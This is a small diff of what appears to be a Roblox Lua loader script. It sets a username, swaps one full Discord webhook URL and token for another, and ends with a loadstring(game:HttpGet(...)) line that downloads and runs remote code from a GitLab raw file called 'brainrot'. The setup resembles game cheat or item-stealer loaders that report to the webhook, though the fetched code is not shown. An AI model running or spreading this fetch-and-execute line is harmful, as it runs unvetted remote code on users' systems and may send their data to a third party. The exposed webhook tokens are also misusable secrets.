@@ -1,4 +1,4 @@
 Username = "Spykidnumber100"
-Webhook = "https://discord.com/api/webhooks/1394090650764316753/kreml3_qdo31WKZdFqagXWyADvnxDB1ZgsVxK6pDXIcIG6ngY7_ns8qdcE8JDzsV8w8p"
+Webhook = "https://discord.com/api/webhooks/1394321320816283758/Vxvh5AWQAGr8UynvLTjqnFwpC4Lg9xzvJNkh51BjIIAwJ9rrI5ALDsVt2mA-u306IgPx"
 
 loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/brainrot"))()
